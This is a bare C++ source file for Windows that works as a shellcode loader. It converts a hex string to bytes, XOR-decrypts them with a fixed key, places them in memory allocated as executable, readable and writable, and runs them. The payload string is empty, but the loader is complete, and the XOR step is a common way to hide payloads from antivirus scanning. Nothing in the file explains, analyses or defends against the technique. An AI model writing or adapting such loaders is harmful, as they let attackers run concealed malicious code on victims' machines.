#include <Windows.h>
#include <iostream>
#include <vector>
#include <sstream>
#include <iomanip>

// Function to convert a hex string to binary data
std::vector<unsigned char> hex_string_to_binary(const std::string& hex) {
    std::vector<unsigned char> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        std::string byteString = hex.substr(i, 2);
        char byte = static_cast<char>(strtol(byteString.c_str(), nullptr, 16));
        bytes.push_back(byte);
    }
    return bytes;
}

// Function to perform XOR encryption/decryption
void xor_encrypt_decrypt(std::vector<unsigned char>& data, unsigned char key) {
    for (auto& byte : data) {
        byte ^= key;
    }
}

int main() {
    // Example shellcode as a hex string
    std::string shellcode_hex = ""; // Truncated for brevity

    // Convert the hex string to binary data
    std::vector<unsigned char> shellcode = hex_string_to_binary(shellcode_hex);

    // Encryption key
    unsigned char key = '\xAA';

    // Decrypt the shellcode
    xor_encrypt_decrypt(shellcode, key);

    
    // Allocate memory for the shellcode
    void *exec = VirtualAlloc(0, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec == NULL) {
        std::cerr << "VirtualAlloc failed" << std::endl;
        return 1;
    }

    // Copy the shellcode to the allocated memory
    memcpy(exec, shellcode.data(), shellcode.size());

    // Execute the shellcode
    reinterpret_cast<void(*)()>(exec)();

    // Free the allocated memory after use
    VirtualFree(exec, 0, MEM_RELEASE);

    return 0;
}
